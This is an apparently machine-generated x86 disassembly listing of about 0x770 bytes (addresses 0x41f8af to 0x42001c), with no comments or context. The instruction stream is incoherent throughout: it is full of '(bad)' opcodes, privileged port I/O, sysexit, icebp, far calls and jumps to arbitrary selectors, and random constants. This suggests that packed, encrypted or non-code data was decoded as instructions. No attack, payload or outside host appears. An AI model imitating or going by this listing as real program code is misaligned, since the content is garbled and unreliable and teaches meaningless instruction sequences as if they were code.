  41f8af:	repz and ebp,DWORD PTR [edx+0x49780984]
  41f8b6:	mul    DWORD PTR [eax-0xd5be66]
  41f8bc:	pushf  
  41f8bd:	cvtps2pi mm7,xmm4
  41f8c0:	mov    al,ds:0x810f6f72
  41f8c5:	or     bh,BYTE PTR [ebx+ebx*1]
  41f8c8:	retf   0x693e
  41f8cb:	les    esi,FWORD PTR ds:0xeaafe456
  41f8d1:	in     eax,0xbe
  41f8d3:	mov    edx,0x996e0db3
  41f8d8:	sub    DWORD PTR [ebx+0x87d60],edi
  41f8de:	pop    esp
  41f8df:	jecxz  0x41f8b0
  41f8e1:	add    bh,BYTE PTR [edx+0x59150bca]
  41f8e7:	bswap  ecx
  41f8e9:	cs pop ecx
  41f8eb:	dec    esp
  41f8ec:	dec    eax
  41f8ed:	xchg   ebp,eax
  41f8ee:	add    al,0x4f
  41f8f0:	sbb    eax,0xdb274226
  41f8f5:	cmp    BYTE PTR [eax],0x29
  41f8f8:	and    bh,0x6a
  41f8fb:	(bad)  
  41f8fc:	sub    BYTE PTR [edi-0x5],ch
  41f8ff:	pusha  
  41f900:	xchg   ebx,eax
  41f901:	aam    0xc4
  41f903:	mov    eax,0x8a1ae5b3
  41f908:	xchg   BYTE PTR [edx-0x22960c07],dh
  41f90e:	or     eax,0x5c8db070
  41f913:	mov    BYTE PTR [ebx+edi*4],bh
  41f916:	loop   0x41f985
  41f918:	jg     0x41f954
  41f91a:	add    al,0xd7
  41f91c:	ja     0x41f996
  41f91e:	popf   
  41f91f:	enter  0xaf9a,0x7a
  41f923:	or     al,0x6f
  41f925:	mov    esp,0xc86f42d9
  41f92a:	jnp    0x41f8f9
  41f92c:	fisubr WORD PTR [ebp-0x17e58069]
  41f932:	cmp    BYTE PTR ds:0xea7f830d,dl
  41f938:	lahf   
  41f939:	dec    ebp
  41f93a:	imul   esi,esp,0x10
  41f93d:	sbb    ah,BYTE PTR ds:0xae3ca027
  41f943:	xchg   DWORD PTR [eax-0x6c57fe1a],ebx
  41f949:	jo     0x41f8ea
  41f94b:	add    bh,BYTE PTR [eax-0x1a]
  41f94e:	sbb    bl,BYTE PTR [ebx+ecx*1-0x628a3eb3]
  41f955:	and    ecx,DWORD PTR [ebp-0x7a]
  41f958:	jbe    0x41f98f
  41f95a:	loopne 0x41f996
  41f95c:	(bad)  
  41f95d:	sbb    esp,0x44
  41f960:	inc    eax
  41f961:	add    al,0xcc
  41f963:	or     BYTE PTR [edx],bh
  41f965:	scas   al,BYTE PTR es:[edi]
  41f966:	std    
  41f967:	xchg   ah,dl
  41f969:	dec    edi
  41f96a:	fs adc eax,0x376f74e0
  41f970:	loopne 0x41f98b
  41f972:	cmp    al,0x40
  41f974:	dec    esi
  41f975:	cdq    
  41f976:	sbb    al,0x36
  41f978:	xor    BYTE PTR [ebp-0x7ec7c64e],cl
  41f97e:	mov    bl,0x6c
  41f980:	outs   dx,DWORD PTR ds:[esi]
  41f981:	add    dl,BYTE PTR [eax+0x2523f702]
  41f987:	sbb    bh,bh
  41f989:	add    ebx,eax
  41f98b:	dec    eax
  41f98c:	std    
  41f98d:	fnstenv [ebx+0x78]
  41f990:	add    BYTE PTR [edx],ch
  41f992:	mov    ?,WORD PTR [esi-0x3eb893a3]
  41f998:	sbb    al,0xd2
  41f99a:	addr16 adc eax,0x505ba244
  41f9a0:	jbe    0x41f955
  41f9a2:	ins    DWORD PTR es:[edi],dx
  41f9a3:	cmp    DWORD PTR [esi],eax
  41f9a5:	jo     0x41f9f3
  41f9a7:	test   bl,dh
  41f9a9:	mov    ds:0xd5549f45,eax
  41f9ae:	push   ss
  41f9af:	xor    eax,0x1efc72f0
  41f9b4:	bound  esi,QWORD PTR [esi-0x40]
  41f9b7:	mov    ebp,0x7404404b
  41f9bc:	call   0x35b:0x4efbc35f
  41f9c3:	xchg   DWORD PTR [ebp+0x15f2c840],esp
  41f9c9:	test   al,0xd7
  41f9cb:	outs   dx,DWORD PTR ds:[esi]
  41f9cc:	adc    bh,BYTE PTR [edi+ebp*2+0x3d]
  41f9d0:	jmp    0x6477d76b
  41f9d5:	mov    ebx,0xa32472b6
  41f9da:	lds    esp,FWORD PTR [edx+esi*2-0x6d]
  41f9de:	push   es
  41f9df:	mov    ds:0xaaf0b4f2,eax
  41f9e4:	and    DWORD PTR [eax],eax
	...
  41f9ee:	add    BYTE PTR [eax],al
  41f9f0:	add    BYTE PTR [edi-0x637fe3d1],bh
  41f9f6:	mov    bl,0xbf
  41f9f8:	aas    
  41f9f9:	sysexit 
  41f9fb:	pop    ecx
  41f9fc:	push   ss
  41f9fd:	and    DWORD PTR [eax],eax
  41f9ff:	outs   dx,BYTE PTR ds:[esi]
  41fa00:	lahf   
  41fa01:	test   DWORD PTR [ecx+eax*1+0x0],esi
  41fa05:	lods   al,BYTE PTR ds:[esi]
  41fa06:	add    eax,DWORD PTR [eax]
  41fa08:	add    BYTE PTR [ebp+0x4ef3c3f8],ah
  41fa0e:	popa   
  41fa0f:	xchg   esi,eax
  41fa10:	je     0x41fa6e
  41fa12:	lods   al,BYTE PTR ds:[esi]
  41fa13:	leave  
  41fa14:	xchg   BYTE PTR [edx],dl
  41fa16:	mov    edx,0xd9f75532
  41fa1b:	shl    ch,1
  41fa1d:	mov    ds:0x6cbb99e,eax
  41fa22:	cwde   
  41fa23:	popf   
  41fa24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa25:	ja     0x41fa55
  41fa27:	daa    
  41fa28:	lds    edx,FWORD PTR [ebp+0x43410caa]
  41fa2e:	or     dl,BYTE PTR [ecx-0x60e07744]
  41fa34:	arpl   WORD PTR [ecx+0x65],si
  41fa37:	int    0x8d
  41fa39:	shr    BYTE PTR [edi+0x6d],1
  41fa3c:	jmp    0x5141b7bd
  41fa41:	push   0x823689df
  41fa46:	ss hlt 
  41fa48:	pop    ecx
  41fa49:	leave  
  41fa4a:	fmul   QWORD PTR ds:[ebp-0x710c2a77]
  41fa51:	add    al,0xfc
  41fa53:	cmp    BYTE PTR [eax-0x718b6437],ch
  41fa59:	sub    esi,ebp
  41fa5b:	dec    ecx
  41fa5c:	or     cl,BYTE PTR [eax+0x7a]
  41fa5f:	sahf   
  41fa60:	icebp  
  41fa61:	rol    dl,1
  41fa63:	shl    DWORD PTR [edx+0xfc70dc0],cl
  41fa69:	pop    esp
  41fa6a:	jle    0x41f9f5
  41fa6c:	xor    al,0x88
  41fa6e:	pop    esi
  41fa6f:	xor    bh,0x7
  41fa72:	(bad)  
  41fa74:	xchg   esp,eax
  41fa75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa76:	jecxz  0x41fa65
  41fa78:	pop    eax
  41fa79:	and    eax,0x48f4a684
  41fa7e:	add    dl,BYTE PTR [ebx]
  41fa80:	sub    al,0x86
  41fa82:	fsubr  DWORD PTR [edx]
  41fa85:	mov    BYTE PTR [esi],al
  41fa87:	inc    ebx
  41fa88:	js     0x41fabe
  41fa8a:	loop   0x41fa28
  41fa8c:	pop    edx
  41fa8d:	popf   
  41fa8e:	push   esp
  41fa8f:	test   edi,eax
  41fa91:	fdivr  QWORD PTR [ebp+0x67]
  41fa94:	outs   dx,DWORD PTR ds:[esi]
  41fa95:	mov    ds:0xcd2795a7,al
  41fa9a:	sti    
  41fa9b:	and    BYTE PTR [ecx+edx*8+0x58ace95e],cl
  41faa2:	xor    BYTE PTR [ebp+ebx*8+0x64],dl
  41faa6:	sti    
  41faa7:	hlt    
  41faa8:	xor    bh,BYTE PTR [edx]
  41faaa:	dec    ebx
  41faab:	loopne 0x41fb14
  41faad:	scas   al,BYTE PTR es:[edi]
  41faae:	test   eax,0x93327772
  41fab3:	sbb    cl,BYTE PTR [ebx+eiz*2]
  41fab6:	cmp    al,0xc7
  41fab8:	push   edi
  41fab9:	xor    ebp,DWORD PTR [ebx-0x6c]
  41fabc:	(bad)  
  41fabd:	fcomi  st,st(4)
  41fabf:	in     al,0x9b
  41fac1:	mov    dl,0x1d
  41fac3:	ficom  WORD PTR [edi-0x182009d9]
  41fac9:	retf   
  41faca:	pop    esi
  41facb:	into   
  41facc:	(bad)  
  41facd:	push   ebx
  41face:	loope  0x41fb26
  41fad0:	add    DWORD PTR [edx+0x11],edx
  41fad3:	mov    cl,bh
  41fad5:	daa    
  41fad6:	jmp    0x41fa59
  41fad8:	xor    al,0x4f
  41fada:	stc    
  41fadb:	pop    eax
  41fadc:	pop    esi
  41fadd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fade:	test   eax,0x9b9b4ef2
  41fae3:	sbb    eax,0x940c7dec
  41fae8:	or     al,0xb5
  41faea:	mov    WORD PTR [ecx],?
  41faec:	lock pop ds
  41faee:	jl     0x41fa84
  41faf0:	fmul   QWORD PTR [eax]
  41faf2:	int    0x59
  41faf4:	pop    ebx
  41faf5:	nop
  41faf6:	jp     0x41fb43
  41faf8:	jl     0x41fa9c
  41fafa:	or     DWORD PTR [ecx],ebp
  41fafc:	out    0x3,al
  41fafe:	or     ebp,eax
  41fb00:	stos   BYTE PTR es:[edi],al
  41fb01:	dec    esi
  41fb02:	cmc    
  41fb03:	xor    esp,DWORD PTR [eax]
  41fb05:	cmp    dl,BYTE PTR ds:0xa8e0274
  41fb0b:	and    ecx,edi
  41fb0d:	xor    cl,dl
  41fb0f:	aam    0x88
  41fb11:	hlt    
  41fb12:	or     ah,dl
  41fb14:	sub    esp,DWORD PTR [edx-0x1c]
  41fb17:	mov    BYTE PTR ds:0x3afc0696,dh
  41fb1d:	jg     0x41fabb
  41fb1f:	pop    edi
  41fb20:	push   eax
  41fb21:	push   esi
  41fb22:	call   0xde77:0x2a4979ac
  41fb29:	fcmovnb st,st(7)
  41fb2b:	rcr    esi,cl
  41fb2d:	sar    BYTE PTR [ecx],1
  41fb2f:	adc    al,0x6
  41fb32:	xchg   ebx,eax
  41fb33:	mov    esp,0xe8fc96fa
  41fb38:	pop    ss
  41fb39:	shl    edx,cl
  41fb3b:	gs pop ss
  41fb3d:	add    al,0x38
  41fb3f:	lahf   
  41fb40:	mov    ebp,0xfbd1e890
  41fb45:	jmp    0x4edf117d
  41fb4a:	xor    DWORD PTR [ecx],0xfc3df60d
  41fb50:	frstor [eax-0x640803a1]
  41fb56:	inc    edx
  41fb57:	sbb    BYTE PTR [ebp-0x21],dl
  41fb5a:	add    BYTE PTR [edx-0x12],dh
  41fb5d:	xor    eax,0xcc35e213
  41fb62:	call   0x12e2:0xee255a19
  41fb69:	sbb    eax,0xdf8b471d
  41fb6e:	(bad)  
  41fb6f:	rol    DWORD PTR [esi],cl
  41fb71:	lahf   
  41fb72:	and    eax,0x7e22ca4a
  41fb77:	sbb    BYTE PTR [ebp*8-0x39349de2],al
  41fb7e:	push   edx
  41fb7f:	mov    ah,ah
  41fb81:	mov    ds:0x4eb23021,eax
  41fb86:	addr16 jg 0x41fb0c
  41fb89:	push   es
  41fb8a:	sub    esp,0x2f1aa694
  41fb90:	mov    ah,0xcc
  41fb92:	cs jle 0x41fb19
  41fb95:	hlt    
  41fb96:	jnp    0x41fb78
  41fb98:	sbb    bl,BYTE PTR [ecx]
  41fb9a:	ret    0x374
  41fb9d:	dec    ecx
  41fb9e:	es (bad) 
  41fba0:	in     al,dx
  41fba1:	pop    edi
  41fba2:	adc    ebp,esp
  41fba4:	stos   BYTE PTR es:[edi],al
  41fba5:	add    edx,DWORD PTR [ecx]
  41fba7:	hlt    
  41fba8:	pop    esi
  41fba9:	int    0x9e
  41fbab:	xor    DWORD PTR [ebp-0x6b],eax
  41fbae:	sub    BYTE PTR [edi-0x6ba954f],ah
  41fbb4:	ins    BYTE PTR es:[edi],dx
  41fbb5:	and    bh,al
  41fbb7:	(bad)  
  41fbb9:	ds sub dh,cl
  41fbbc:	jl     0x41fc29
  41fbbe:	sbb    edx,DWORD PTR ds:0xf8e5494c
  41fbc4:	nop
  41fbc5:	imul   ebp,esi,0xffffffcf
  41fbc8:	mov    edi,es
  41fbca:	aam    0xf2
  41fbcc:	popa   
  41fbcd:	sbb    eax,0xfc0faa6f
  41fbd2:	shr    DWORD PTR [esi+0x7d],0x3
  41fbd6:	adc    eax,0xb49a639c
  41fbdb:	fucomp st(5)
  41fbdd:	sbb    dl,BYTE PTR [edi]
  41fbdf:	test   DWORD PTR [esi-0x67],ebx
  41fbe2:	xor    eax,0xc106be50
  41fbe7:	inc    edi
  41fbe8:	jmp    0x41fc43
  41fbea:	(bad)  
  41fbeb:	cld    
  41fbec:	mov    bh,0x6b
  41fbee:	imul   edi,DWORD PTR [edi+0x2c2143ea],0xae8c22c9
  41fbf8:	pop    ecx
  41fbf9:	mov    al,0xca
  41fbfb:	dec    ebx
  41fbfc:	hlt    
  41fbfd:	mov    eax,ds:0xdef1f801
  41fc02:	sub    esi,edx
  41fc04:	aam    0x47
  41fc06:	jb     0x41fc5f
  41fc08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc09:	js     0x41fc5a
  41fc0b:	sub    DWORD PTR [edi+0x7d9479f6],eax
  41fc11:	pop    edi
  41fc12:	shl    DWORD PTR [edx+0x14],0xdc
  41fc16:	jge    0x41fc8e
  41fc18:	inc    edi
  41fc19:	push   esp
  41fc1a:	pop    esi
  41fc1b:	ja     0x41fc63
  41fc1d:	adc    eax,0xbb0a0d6
  41fc22:	test   eax,0xb3610786
  41fc27:	pop    eax
  41fc28:	arpl   si,sp
  41fc2a:	or     eax,0xfab4ef7f
  41fc2f:	jg     0x41fc79
  41fc31:	fwait
  41fc32:	mov    ecx,0xc0959471
  41fc37:	jne    0x41fc83
  41fc39:	sub    dl,BYTE PTR [ebx]
  41fc3b:	and    ecx,DWORD PTR [edx]
  41fc3d:	hlt    
  41fc3e:	test   eax,0x851ac6b5
  41fc43:	loop   0x41fc52
  41fc45:	cmp    DWORD PTR [edi+eiz*8],0xdd33caa3
  41fc4c:	adc    dh,bl
  41fc4e:	and    al,0x37
  41fc50:	imul   edi,DWORD PTR [edx],0xd16c46e9
  41fc56:	hlt    
  41fc57:	inc    eax
  41fc58:	jecxz  0x41fbf0
  41fc5a:	(bad)  
  41fc5b:	out    dx,eax
  41fc5c:	or     BYTE PTR [ecx],dh
  41fc5e:	mov    ah,BYTE PTR [edi-0x17]
  41fc61:	dec    edi
  41fc62:	add    ch,dh
  41fc64:	jno    0x41fc37
  41fc66:	inc    esi
  41fc67:	mov    DWORD PTR [edx+0x79],edi
  41fc6a:	inc    ecx
  41fc6b:	mov    al,ds:0x72988661
  41fc70:	inc    ebx
  41fc71:	fstp   DWORD PTR [eax-0x1d1bd484]
  41fc77:	dec    eax
  41fc78:	lea    edx,[ebp-0x34]
  41fc7b:	out    0xd5,al
  41fc7d:	jge    0x41fceb
  41fc7f:	out    dx,al
  41fc80:	outs   dx,BYTE PTR ds:[esi]
  41fc81:	jge    0x41fc6b
  41fc83:	aam    0xe
  41fc85:	mov    edi,0x5156b0b6
  41fc8a:	dec    ebx
  41fc8b:	xor    al,0x2a
  41fc8d:	sbb    eax,0xffc7e9e
  41fc92:	aam    0x51
  41fc94:	in     al,0x8b
  41fc96:	sar    DWORD PTR [ebx-0x4d],0x4d
  41fc9a:	(bad)  
  41fc9b:	xchg   ebx,eax
  41fc9c:	push   ebp
  41fc9d:	ret    
  41fc9e:	inc    esi
  41fc9f:	xlat   BYTE PTR ds:[ebx]
  41fca0:	clc    
  41fca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fca2:	scas   eax,DWORD PTR es:[edi]
  41fca3:	int    0x29
  41fca5:	jns    0x41fc64
  41fca7:	add    ah,BYTE PTR [ebx-0x67fed826]
  41fcad:	push   ss
  41fcae:	cmp    BYTE PTR [edi-0x53],0xc9
  41fcb2:	xor    al,0x4b
  41fcb4:	fwait
  41fcb5:	aad    0x80
  41fcb7:	outs   dx,BYTE PTR ds:[esi]
  41fcb8:	(bad)  
  41fcb9:	jns    0x41fc94
  41fcbb:	aam    0x17
  41fcbd:	push   ebp
  41fcbe:	pop    ecx
  41fcbf:	xlat   BYTE PTR ds:[ebx]
  41fcc0:	mov    edi,0xdd796778
  41fcc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcc6:	fucomi st,st(0)
  41fcc8:	ss icebp 
  41fcca:	mov    edi,0xfc13ed6b
  41fccf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcd0:	sbb    dl,BYTE PTR [edi+0x12]
  41fcd3:	jp     0x41fcd2
  41fcd5:	mov    edi,0x722c12e4
  41fcda:	or     al,0x1e
  41fcdc:	or     DWORD PTR [ebp-0x5534d9d0],ecx
  41fce2:	pop    ebx
  41fce3:	cdq    
  41fce4:	shl    BYTE PTR [edx],0xd4
  41fce7:	loope  0x41fc7d
  41fce9:	sbb    DWORD PTR [esp+eiz*4+0x1649d451],esi
  41fcf0:	and    al,0x53
  41fcf2:	pop    es
  41fcf3:	mov    ecx,0x661c9d00
  41fcf8:	cmp    edi,ebp
  41fcfa:	dec    eax
  41fcfb:	aad    0xd4
  41fcfd:	mov    ecx,DWORD PTR [ecx]
  41fcff:	dec    BYTE PTR [edx-0x247fe530]
  41fd05:	cmp    esp,DWORD PTR [eax+0x7b]
  41fd08:	xor    eax,ecx
  41fd0a:	(bad)  
  41fd0b:	call   0x10ae5a44
  41fd10:	mov    ds:0xbf4898e0,eax
  41fd15:	ficom  WORD PTR [edx+0x608623c0]
  41fd1b:	sub    BYTE PTR [ebx+ebx*1+0x36932541],al
  41fd22:	call   0x7dd0:0x37c2050c
  41fd29:	popa   
  41fd2a:	retf   0x7de
  41fd2d:	sbb    al,0x34
  41fd2f:	mov    ds:0x6c7d2ab2,eax
  41fd34:	fs cdq 
  41fd36:	sbb    al,0xd6
  41fd38:	inc    ebx
  41fd39:	je     0x41fd2d
  41fd3b:	pusha  
  41fd3c:	and    BYTE PTR [edi],bl
  41fd3e:	inc    ecx
  41fd3f:	sahf   
  41fd40:	imul   ecx,DWORD PTR [ebx],0x71
  41fd43:	or     DWORD PTR [edx+ebx*4+0x4e],esp
  41fd47:	fcomp  QWORD PTR [esi]
  41fd49:	or     DWORD PTR ds:0x47aa704c,edx
  41fd4f:	sbb    DWORD PTR [edi-0x54],eax
  41fd52:	enter  0x36b9,0x8e
  41fd56:	mov    WORD PTR [esi-0x1a],?
  41fd59:	xchg   ebx,eax
  41fd5a:	lds    esi,FWORD PTR [ecx+0x79]
  41fd5d:	das    
  41fd5e:	xchg   ebp,eax
  41fd5f:	adc    DWORD PTR [ebx-0x653a1dbe],edx
  41fd65:	inc    edi
  41fd66:	and    eax,0x7747762d
  41fd6b:	or     BYTE PTR [edi],ah
  41fd6d:	inc    esp
  41fd6e:	sbb    BYTE PTR [edi-0x38],bl
  41fd71:	stos   BYTE PTR es:[edi],al
  41fd72:	(bad)  
  41fd74:	dec    esi
  41fd75:	in     eax,0xe4
  41fd77:	jo     0x41fdb7
  41fd79:	hlt    
  41fd7a:	xor    BYTE PTR [ecx+edi*8],0x8
  41fd7e:	cmc    
  41fd7f:	xor    eax,0x78070ece
  41fd84:	jle    0x41fd31
  41fd86:	pop    ss
  41fd87:	push   esi
  41fd88:	add    dh,BYTE PTR [ecx]
  41fd8a:	in     eax,dx
  41fd8b:	daa    
  41fd8c:	cdq    
  41fd8d:	out    dx,eax
  41fd8e:	mov    esi,0x459a353f
  41fd93:	adc    al,0x73
  41fd95:	cmp    ah,BYTE PTR [ebp-0x2c]
  41fd98:	inc    ecx
  41fd99:	push   ds
  41fd9a:	add    al,0x66
  41fd9c:	push   es
  41fd9d:	repnz inc esi
  41fd9f:	(bad)  
  41fda0:	mov    edi,0x1ba5ea23
  41fda5:	or     BYTE PTR [ebp+0x12],al
  41fda8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fda9:	ret    
  41fdaa:	xchg   edx,eax
  41fdab:	aad    0x3a
  41fdad:	popa   
  41fdae:	add    dh,ah
  41fdb0:	dec    ebp
  41fdb1:	mov    ebx,0x2d986d
	...
  41fdbe:	add    BYTE PTR [eax],al
  41fdc0:	add    BYTE PTR [ecx-0x400c494c],cl
  41fdc6:	repz int 0xfe
  41fdc9:	push   ebp
  41fdca:	cmp    BYTE PTR [edx-0x7a],bl
  41fdcd:	push   es
  41fdce:	push   ds
  41fdcf:	push   esp
  41fdd0:	repnz xor DWORD PTR [eax+0x1],edi
  41fdd4:	add    BYTE PTR [ebx+eax*1+0x3f1b0000],ch
  41fddb:	std    
  41fddc:	bound  edi,QWORD PTR [edi+ebp*2+0x36]
  41fde0:	mov    esp,0xa7e5ddc6
  41fde5:	arpl   WORD PTR [ecx+0x527262c5],bp
  41fdeb:	push   ecx
  41fdec:	(bad)  
  41fdee:	jmp    0x41fd8c
  41fdf0:	scas   eax,DWORD PTR es:[edi]
  41fdf1:	inc    DWORD PTR [ebx-0x664c0208]
  41fdf7:	jecxz  0x41fe64
  41fdf9:	inc    edx
  41fdfa:	outs   dx,DWORD PTR ds:[esi]
  41fdfb:	inc    eax
  41fdfc:	adc    DWORD PTR [esi],esi
  41fdfe:	sbb    dh,BYTE PTR [ebx-0xab98500]
  41fe04:	fimul  DWORD PTR [eax-0x12]
  41fe07:	addr16 cmp edx,esi
  41fe0a:	cli    
  41fe0b:	mov    eax,ds:0x3ed1eee3
  41fe10:	jge    0x41fe0b
  41fe12:	inc    esi
  41fe13:	loopne 0x41fddd
  41fe15:	adc    BYTE PTR [esi],dh
  41fe17:	mov    ecx,0xfc61fedc
  41fe1c:	adc    bh,BYTE PTR [edx]
  41fe1e:	dec    esi
  41fe1f:	xchg   cl,bh
  41fe21:	sub    ah,BYTE PTR ds:0x9faa308f
  41fe27:	push   cs
  41fe28:	jg     0x41fe30
  41fe2a:	push   ds
  41fe2b:	stos   BYTE PTR es:[edi],al
  41fe2c:	jmp    0x59e7:0xe18f6aff
  41fe33:	pop    ss
  41fe34:	ja     0x41fea0
  41fe36:	mov    bl,0x51
  41fe38:	xor    eax,0x729f6898
  41fe3d:	test   BYTE PTR [edx],cl
  41fe3f:	push   esi
  41fe40:	sbb    ah,bh
  41fe42:	mov    dl,0xec
  41fe44:	aaa    
  41fe45:	ins    DWORD PTR es:[edi],dx
  41fe46:	std    
  41fe47:	into   
  41fe48:	adc    cl,BYTE PTR [ecx-0x34]
  41fe4b:	jecxz  0x41fe0c
  41fe4d:	sbb    ebp,DWORD PTR [edx+0x5b]
  41fe50:	dec    eax
  41fe51:	gs mov ch,0x6e
  41fe54:	fbld   TBYTE PTR [ebx-0x4800bb8f]
  41fe5a:	dec    ebx
  41fe5b:	sub    eax,0xe5c91d1e
  41fe60:	add    edi,edx
  41fe62:	in     al,0x6f
  41fe64:	cmp    BYTE PTR [ebx+0x6187ef43],0x2a
  41fe6b:	aaa    
  41fe6c:	aaa    
  41fe6d:	xor    al,0xd5
  41fe6f:	pop    DWORD PTR [eax+0x508d3475]
  41fe75:	mov    ch,0xa7
  41fe77:	cmp    DWORD PTR [ebp-0x53],edx
  41fe7a:	xchg   bl,cl
  41fe7c:	ja     0x41feea
  41fe7e:	or     al,0x9d
  41fe80:	push   esi
  41fe81:	xor    ecx,esp
  41fe83:	jmp    0x78016af3
  41fe88:	scas   eax,DWORD PTR es:[edi]
  41fe89:	or     ebp,DWORD PTR [ebp+0x32]
  41fe8c:	xchg   ecx,eax
  41fe8d:	dec    esi
  41fe8e:	or     bh,BYTE PTR [ebp-0x47a20ef8]
  41fe94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe95:	mul    BYTE PTR [esi+0x10]
  41fe98:	xchg   ebx,eax
  41fe99:	push   0x14
  41fe9b:	jno    0x41fe53
  41fe9d:	push   0xffffff97
  41fe9f:	loope  0x41fe49
  41fea1:	mov    eax,0x8da39e03
  41fea6:	es aas 
  41fea8:	sbb    esi,ecx
  41feaa:	add    al,0x63
  41feac:	repz mov esi,DWORD PTR [ecx]
  41feaf:	adc    BYTE PTR [eax-0x41e76627],ah
  41feb5:	sbb    bh,ch
  41feb7:	in     eax,dx
  41feb8:	enter  0x6f3f,0xe
  41febc:	hlt    
  41febd:	push   ss
  41febe:	in     eax,0xfa
  41fec0:	cli    
  41fec1:	xor    BYTE PTR [eax],al
  41fec3:	xchg   ebx,eax
  41fec4:	loope  0x41feef
  41fec6:	sbb    eax,0x59845313
  41fecb:	and    dh,ch
  41fecd:	mov    ch,0xa5
  41fecf:	mov    ch,0xf8
  41fed1:	mov    eax,ds:0x57d788c4
  41fed6:	adc    esp,DWORD PTR [edi-0x62]
  41fed9:	mov    edx,DWORD PTR [ebp+0x123f02eb]
  41fedf:	imul   ecx,DWORD PTR [esi],0x6d0e678b
  41fee5:	inc    edi
  41fee6:	out    0xae,al
  41fee8:	pop    esi
  41fee9:	popf   
  41feea:	fisttp WORD PTR [edi-0x7406bcb2]
  41fef0:	repnz aaa 
  41fef2:	pop    es
  41fef3:	xchg   esi,eax
  41fef4:	mov    al,0xbd
  41fef6:	ss push ss
  41fef8:	dec    ebx
  41fef9:	xchg   edi,eax
  41fefa:	cmp    BYTE PTR [esi],dh
  41fefc:	dec    eax
  41fefd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fefe:	xlat   BYTE PTR ds:[ebx]
  41feff:	push   ebx
  41ff00:	scas   eax,DWORD PTR es:[edi]
  41ff01:	sub    al,dh
  41ff03:	retf   0x2256
  41ff06:	scas   al,BYTE PTR es:[edi]
  41ff07:	jg     0x41ff2f
  41ff09:	mov    gs:0xca24d32e,al
  41ff0f:	lea    eax,[esi-0x6d]
  41ff12:	in     al,dx
  41ff13:	cwde   
  41ff14:	sti    
  41ff15:	repnz cmp al,0x9a
  41ff18:	aad    0x4e
  41ff1a:	jl     0x41ff76
  41ff1c:	jg     0x41fed1
  41ff1e:	add    al,0xbc
  41ff20:	jge    0x41ff65
  41ff22:	out    dx,al
  41ff23:	mov    esi,0x9636452b
  41ff28:	push   0xdb579b27
  41ff2d:	(bad)  
  41ff2e:	nop
  41ff2f:	xchg   edi,eax
  41ff30:	xchg   ebx,eax
  41ff31:	repz fnstcw WORD PTR [ecx+0xaa11b]
  41ff38:	lods   al,BYTE PTR ds:[esi]
  41ff39:	and    BYTE PTR [ebp-0x6f],0x45
  41ff3d:	push   eax
  41ff3e:	addr16 jg 0x41ffc0
  41ff41:	out    0x4c,al
  41ff43:	mov    dh,0x55
  41ff45:	pop    ebx
  41ff46:	stc    
  41ff47:	mov    ebx,0xc87f8681
  41ff4c:	repz shr BYTE PTR [edi],1
  41ff4f:	mov    ecx,0x22fe952f
  41ff54:	fdivr  QWORD PTR [ecx-0x18]
  41ff57:	mov    edi,0x87298d3b
  41ff5c:	xor    eax,0xcb2980f2
  41ff61:	std    
  41ff62:	popa   
  41ff63:	sbb    DWORD PTR [ebx+eax*1-0x4aaffe15],edi
  41ff6a:	cwde   
  41ff6b:	cmp    BYTE PTR [eax+0x16f50c9d],0x57
  41ff72:	test   al,0x26
  41ff74:	mov    dl,0x8c
  41ff76:	mov    esi,0xcde7670a
  41ff7b:	cmp    DWORD PTR [ebp+ebx*2-0x66],0x41
  41ff80:	push   edx
  41ff81:	outs   dx,DWORD PTR ds:[esi]
  41ff82:	into   
  41ff83:	push   es
  41ff84:	rol    BYTE PTR [edx+ecx*8-0x34],1
  41ff88:	cmp    al,0x84
  41ff8a:	(bad)  
  41ff8c:	push   es
  41ff8d:	retf   0xbde5
  41ff90:	fstp   st(1)
  41ff92:	lds    ebx,FWORD PTR [ebx-0x1334aa9]
  41ff98:	leave  
  41ff99:	sbb    ecx,ecx
  41ff9b:	jae    0x41ff23
  41ff9d:	jo     0x41ff5f
  41ff9f:	and    esi,DWORD PTR [ebx+eax*2-0x14]
  41ffa3:	xchg   ecx,eax
  41ffa4:	jno    0x41ffa5
  41ffa6:	test   DWORD PTR [edx],esi
  41ffa8:	leave  
  41ffa9:	sub    cl,cl
  41ffab:	imul   ebx,DWORD PTR [esi],0x32
  41ffae:	cld    
  41ffaf:	je     0x41fffa
  41ffb1:	pop    ecx
  41ffb3:	in     eax,dx
  41ffb4:	xchg   ebx,eax
  41ffb5:	ret    0xb5c3
  41ffb8:	dec    eax
  41ffb9:	xchg   esi,eax
  41ffba:	stc    
  41ffbb:	and    al,0xd7
  41ffbd:	ror    DWORD PTR [ecx+0x72ee45ee],0x37
  41ffc4:	xchg   ebp,eax
  41ffc6:	out    dx,eax
  41ffc7:	mov    al,ds:0xfa8e477
  41ffcc:	mov    ebp,0x6faa5ba6
  41ffd1:	js     0x420040
  41ffd3:	mov    BYTE PTR cs:0x9968ba33,bl
  41ffda:	xor    BYTE PTR ds:0xac105487,ch
  41ffe0:	xchg   edi,eax
  41ffe1:	pop    ecx
  41ffe2:	iret   
  41ffe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffe4:	aam    0xe6
  41ffe6:	mov    edi,0x999c79c0
  41ffeb:	je     0x420068
  41ffed:	sbb    al,0xd2
  41ffef:	cmp    DWORD PTR [edi+0x69b6bc5e],ebp
  41fff5:	call   0xa55f0c71
  41fffa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fffb:	sub    eax,0xf7ff399f
  420000:	sar    DWORD PTR [esi],1
  420002:	inc    ebx
  420003:	mov    dl,0xb8
  420005:	xor    dl,BYTE PTR [eax+0x25]
  420008:	clc    
  420009:	addr16 mov dh,0x63
  42000c:	dec    ebx
  42000d:	sbb    ebx,ecx
  42000f:	popf   
  420010:	cmp    esi,DWORD PTR [esi-0x3c5b36e5]
  420016:	in     eax,dx
  420017:	test   BYTE PTR [ebx+ebp*1],bl
  42001a:	in     al,0x9f
  42001c:	add    al,0xd5
